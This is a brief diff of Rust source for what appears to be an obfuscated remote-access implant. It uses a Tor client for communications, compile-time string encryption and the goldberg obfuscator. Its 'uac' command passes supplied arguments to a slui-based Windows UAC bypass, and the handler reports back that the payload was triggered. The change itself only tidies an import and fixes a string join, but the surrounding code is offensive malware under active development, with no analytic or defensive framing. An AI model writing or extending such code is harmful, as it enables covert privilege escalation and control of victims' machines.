@@ -17,8 +17,6 @@ use goldberg::goldberg_stmts;
 use is_elevated::is_elevated;
 #[cfg(target_os = "windows")]
 use std::os::windows::process::CommandExt;
-#[cfg(target_os = "windows")]
-use std::env;
 
 use arti_client::{TorClient, DataStream};
 use arti_client::config::TorClientConfigBuilder;
@@ -330,7 +328,7 @@ Available commands:
                     return Ok(b"uac: missing argument\n".to_vec());
                 }
 
-                let payload = args.join(cryptify::encrypt_string!(" "));
+                let payload = args.join(cryptify::encrypt_string!(" ").as_str());
                 uac_bypass::uac_slui(&payload);
 
                 Ok(format!("Triggered UAC (slui) with payload: {}\n", payload).into_bytes())
